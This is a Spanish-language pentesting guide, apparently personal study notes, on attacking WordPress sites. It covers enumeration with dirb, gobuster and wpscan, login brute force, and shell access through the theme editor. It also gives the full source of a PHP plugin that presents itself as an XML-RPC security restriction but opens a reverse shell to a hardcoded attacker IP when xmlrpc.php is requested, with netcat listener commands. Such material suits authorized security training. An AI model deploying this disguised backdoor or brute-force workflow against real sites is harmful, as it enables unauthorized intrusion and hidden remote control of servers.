# 🛡️ Pentesting WordPress
Es el gestor de contenidos (CMS) más utilizado del mundo. Es una plataforma de código abierto que permite crear y gestionar webs y blogs de forma sencilla.

- **Lenguaje:** PHP
- **Base de Datos:** MySQL / MariaDB
- **Directorio por defecto:** `http://<IP>/wordpress`

## 🔍 1. Enumeración y Reconocimiento

### A. Descubrimiento de Directorios (Fuzzing)
Para identificar la estructura del sitio usamos herramientas de fuerza bruta de directorios.
- **Herramienta:** `dirb`
	- `dirb http://<IP>/`

### B. Directorios Interesantes y Críticos

| **Directorio / Archivo**             | **Descripción**                                                                    |
| ------------------------------------ | ---------------------------------------------------------------------------------- |
| `http://<IP>/wordpress`              | Directorio raíz donde está instalado el CMS.                                       |
| `http://<IP>/wordpress/wp-admin.php` | Panel de autenticación (Login de admin).                                           |
| `http://<IP>/wordpress/wp-login.php` | Alternativa al panel de autenticación.                                             |
| `http://<IP>/wordpress/xmlrpc.php`   | ⚠️Crítico:⚠️ Si está activo, permite fuerza bruta masiva (fuzzing/login). (Imagen) |
![[Imagenes/xmlrpcphp.png]]

### C. Identificación de la Versión (Manual)

1. Navegar a la web de WordPress.
2. Ver código fuente (`Ctrl + U`).
3. Buscar la etiqueta **generator**:
    - `<meta name="generator" content="WordPress X.X.X">`

![[Imagenes/WPEtiquetaGenerator.png]]

### D. Enumeración de Plugins
Los plugins se encuentran en `http://<IP>/wp-content/plugins/`. Si la ruta existe, hacemos fuerza bruta con un diccionario específico:
Podemos usar esta [Lista Plugins-Github](https://github.com/Perfectdotexe/WordPress-Plugins-List/blob/master/plugins.txt).
- `gobuster dir -u 'http://<IP>/wp-content/plugins/' -w /ruta/lista/plugins.txt`

- **Identificar versión del plugin:** Si encuentras un plugin (ej. "canto"), busca su archivo `readme.txt`:
    - `http://<IP>/wp-content/plugins/canto/readme.txt`
- **Objetivo:** Con la versión exacta, buscar exploits públicos en internet.

![[Imagenes/WPPluginsFound.png]]

## 🛠️ 2. Enumeración Especializada con WPScan
`wpscan` es la herramienta clave para auditorías de WordPress.
### Comandos de Enumeración:

- **General:** `wpscan --url http://<IP>/wordpress`
- **Usuarios (`-e u`):** `wpscan --url http://<IP>/ -e u`

![[Imagenes/WPUserFound.png]]

- **Plugins (`-e p`):** `wpscan --url http://<IP>/ -e p`
	- `--plugins-detection aggressive` Mayor agresividad para detectar plugins, pero hace mucho más ruido
- **Detección Agresiva (con API Token):**
    - Regístrate en [Wpscan.com](https://wpscan.com/) para obtener un token y mejorar la detección de vulnerabilidades.
- Ej: `wpscan --url 'http://<IP>' -e p --api-token='<TU_TOKEN>' --plugins-detection aggressive`
### Fuerza Bruta de Login:
- **Usuario y Pass específicos:**
	- `wpscan --url http://<IP>/wordpress -U mario -P /ruta/lista/passwords.txt -t 20`
		- `-t <number>`: Especificar número de hilos

_(Se pueden usar listas tanto para `-U` como para `-P`)._

![[Imagenes/WPBruteForce.png]]

_(Estas credenciales las puedes usar en /wp-admin.php o /wp-login.php)_
## 🚀 3. Acceso al Sistema (Explotación)
### Método 1: Modificación de Tema (Theme Editor)
Si tienes credenciales de administrador:

1. Ve al panel lateral: **Appearance** -> **Theme Editor**.
2. Si no está, instala el plugin "Theme Editor".
3. Selecciona un archivo (ej: `twentytwentytwo/index.php`).
4. **Acción:** Borra todo y pega una **Reverse Shell en PHP** (ej: [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) o [RevShell](https://www.revshells.com/)).
5. **Configuración:** Cambia la IP de tu Kali y el puerto en el código.

![[Imagenes/WPRevShell.png]]

6. **Ejecución:** Escucha en tu Kali (`nc -lvnp <Puerto>`) y navega a la URL del archivo modificado.

![[Imagenes/WPRevShell2.png]]

### Método 2: Subida de Plugin Malicioso
Crea un archivo `.php` en tu Kali (ej: `plugin.php`) con el siguiente contenido (créditos: El Pinguino de Mario):

```
<?php
/*
Plugin Name: Restrict XMLRPC Access
Plugin URI: https://elrincondelhacker.es/
Description: Restringe el acceso al archivo xmlrpc.php para aumentar la seguridad.
Version: 1.0
Author: El Pinguino de Mario
Author URI: https://elpinguinodemario.es/
License: GPL2
*/

function restrict_xmlrpc_access() {
    if (strpos($_SERVER['REQUEST_URI'], 'xmlrpc.php') !== false) {
        header('HTTP/1.1 403 Forbidden');
        echo 'Cuidadito cuidadín, te pillé leyendo lo que no debías pillín.';

        // IP y Puerto de tu Kali
        $ip = '172.17.0.1';  
        $port = 443;         
        $chunk_size = 1400;

        $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock) { exit(1); }

        $process = proc_open('/bin/sh -i', [
            0 => $sock, 1 => $sock, 2 => $sock 
        ], $pipes);

        if (!is_resource($process)) { fclose($sock); exit(1); }

        while (!feof($sock)) {
            fwrite($sock, fread($sock, $chunk_size));
        }
        fclose($sock);
        proc_close($process);
        exit;
    }
}
add_action('init', 'restrict_xmlrpc_access');
```

**Pasos para activar la Shell:**

1. Sube el plugin desde el panel de administración. 

![[Imagenes/WPUploadPlugin.png]]

2. Activa el plugin en la sección **Plugins**.
3. Ponte a la escucha: `nc -lvnp <Puerto>`.
4. Navega a: `http://<IP>/wordpress/xmlrpc.php`. Esto disparará la función y recibirás la conexión.

#
---
**Navegación:**
- Volver a: [[CMS - Content Management System]]